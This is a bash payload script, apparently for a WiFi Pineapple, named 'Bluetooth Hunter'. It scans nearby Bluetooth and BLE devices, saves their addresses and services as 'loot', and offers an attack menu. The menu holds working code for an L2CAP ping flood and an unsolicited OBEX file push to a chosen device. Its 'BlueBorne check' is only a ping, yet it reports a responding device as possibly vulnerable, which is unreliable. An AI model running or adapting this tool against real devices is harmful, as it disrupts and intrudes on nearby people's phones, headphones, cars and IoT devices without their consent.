#!/bin/bash
# Title: Bluetooth Hunter
# Author: bad-antics
# Description: Scan and attack Bluetooth devices via WiFi Pineapple
# Category: nullsec/recon

LOOT_DIR="/mmc/nullsec/bluetooth"
mkdir -p "$LOOT_DIR"

PROMPT "BLUETOOTH HUNTER

Discover Bluetooth devices
in range:

• Phones/Tablets
• Headphones/Speakers
• Fitness trackers
• Smart watches
• Car systems
• IoT devices

Press OK to scan."

# Check for Bluetooth
if ! hciconfig hci0 2>/dev/null | grep -q "UP"; then
    hciconfig hci0 up 2>/dev/null
    if ! hciconfig hci0 2>/dev/null | grep -q "UP"; then
        ERROR_DIALOG "No Bluetooth adapter
found or failed to
bring up interface."
        exit 1
    fi
fi

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
SCAN_FILE="$LOOT_DIR/bt_scan_$TIMESTAMP.txt"

PROMPT "Scan Options:

1. Quick scan (30s)
2. Deep scan (2min)
3. Continuous track

Select mode."

SCAN_MODE=$(NUMBER_PICKER "Scan mode:" 1)

case $SCAN_MODE in
    1) DURATION=30 ;;
    2) DURATION=120 ;;
    3) DURATION=0 ;;
    *) DURATION=30 ;;
esac

echo "=== Bluetooth Scan ===" > "$SCAN_FILE"
echo "Time: $(date)" >> "$SCAN_FILE"
echo "Mode: $SCAN_MODE" >> "$SCAN_FILE"
echo "" >> "$SCAN_FILE"

SPINNER_START "Scanning Bluetooth devices..."

if [ $DURATION -eq 0 ]; then
    # Continuous mode
    hcitool scan --flush > /tmp/bt_devices.txt &
    SCAN_PID=$!
    
    PROMPT "Continuous scan active.

Press OK to stop."
    
    kill $SCAN_PID 2>/dev/null
else
    # Timed scan
    timeout $DURATION hcitool scan --flush > /tmp/bt_devices.txt 2>/dev/null
fi

SPINNER_STOP

# Parse results
BT_COUNT=$(grep -c ":" /tmp/bt_devices.txt 2>/dev/null || echo 0)

echo "=== Classic Bluetooth ===" >> "$SCAN_FILE"
cat /tmp/bt_devices.txt >> "$SCAN_FILE"

# Also scan BLE
SPINNER_START "Scanning BLE devices..."
timeout 30 hcitool lescan > /tmp/ble_devices.txt 2>/dev/null &
sleep 30
kill %1 2>/dev/null
SPINNER_STOP

BLE_COUNT=$(grep -c ":" /tmp/ble_devices.txt 2>/dev/null || echo 0)

echo "" >> "$SCAN_FILE"
echo "=== Bluetooth Low Energy ===" >> "$SCAN_FILE"
sort -u /tmp/ble_devices.txt >> "$SCAN_FILE"

PROMPT "Scan Complete!

Classic BT: $BT_COUNT devices
BLE: $BLE_COUNT devices

Select next action."

ACTION=$(LIST_PICKER "Action:" "1. Device Info" "2. Service Scan" "3. Attack Menu" "4. Save & Exit")

case $ACTION in
    0)
        # Get detailed info
        TARGET_NUM=$(NUMBER_PICKER "Device # for info:" 1)
        TARGET_MAC=$(grep ":" /tmp/bt_devices.txt | sed -n "${TARGET_NUM}p" | awk '{print $1}')
        
        if [ -n "$TARGET_MAC" ]; then
            SPINNER_START "Getting device info..."
            
            echo "" >> "$SCAN_FILE"
            echo "=== Device Details: $TARGET_MAC ===" >> "$SCAN_FILE"
            
            # Device class
            hcitool info "$TARGET_MAC" >> "$SCAN_FILE" 2>/dev/null
            
            # Services
            sdptool browse "$TARGET_MAC" >> "$SCAN_FILE" 2>/dev/null
            
            SPINNER_STOP
            
            PROMPT "Device info saved!

Check $SCAN_FILE
for details."
        fi
        ;;
        
    1)
        # Service discovery
        SPINNER_START "Scanning services..."
        
        echo "" >> "$SCAN_FILE"
        echo "=== Service Discovery ===" >> "$SCAN_FILE"
        
        while read line; do
            MAC=$(echo "$line" | awk '{print $1}')
            if [ -n "$MAC" ]; then
                echo "--- $MAC ---" >> "$SCAN_FILE"
                sdptool browse "$MAC" 2>/dev/null | grep -E "Service Name|Protocol|Channel" >> "$SCAN_FILE"
            fi
        done < /tmp/bt_devices.txt
        
        SPINNER_STOP
        
        PROMPT "Service scan complete!

Results in $SCAN_FILE"
        ;;
        
    2)
        # Attack menu
        ATTACK=$(LIST_PICKER "Attack:" "1. BlueBorne Check" "2. Ping Flood" "3. Audio Inject" "4. File Push")
        
        TARGET_NUM=$(NUMBER_PICKER "Target device #:" 1)
        TARGET_MAC=$(grep ":" /tmp/bt_devices.txt | sed -n "${TARGET_NUM}p" | awk '{print $1}')
        
        case $ATTACK in
            0)
                # BlueBorne vulnerability check (simulated)
                SPINNER_START "Checking BlueBorne..."
                
                l2ping -c 5 "$TARGET_MAC" > /tmp/bb_result.txt 2>&1
                
                SPINNER_STOP
                
                if grep -q "bytes from" /tmp/bb_result.txt; then
                    PROMPT "Device responds to L2CAP

May be vulnerable to
BlueBorne attacks.

MAC: $TARGET_MAC"
                else
                    PROMPT "Device not responding
or patched."
                fi
                ;;
                
            1)
                # L2CAP ping flood
                DURATION=$(NUMBER_PICKER "Flood duration (sec):" 30)
                
                SPINNER_START "Ping flooding..."
                timeout $DURATION l2ping -f "$TARGET_MAC" 2>/dev/null
                SPINNER_STOP
                
                PROMPT "Ping flood complete."
                ;;
                
            2)
                # Audio injection (requires pairing)
                PROMPT "Audio injection requires
prior pairing.

This would inject audio
to Bluetooth speakers/
headphones."
                ;;
                
            3)
                # OBEX file push
                PROMPT "OBEX Push

Send file to device via
Bluetooth OBEX.

Device must accept."
                
                # Create test file
                echo "NullSec was here - $(date)" > /tmp/nullsec.txt
                
                obexftp -b "$TARGET_MAC" -p /tmp/nullsec.txt 2>/dev/null
                
                if [ $? -eq 0 ]; then
                    PROMPT "File sent successfully!"
                else
                    PROMPT "Transfer failed.
Device may have rejected."
                fi
                ;;
        esac
        ;;
        
    3)
        PROMPT "Scan saved to:

$SCAN_FILE

Total devices: $((BT_COUNT + BLE_COUNT))"
        ;;
esac

# Cleanup
rm -f /tmp/bt_devices.txt /tmp/ble_devices.txt /tmp/bb_result.txt
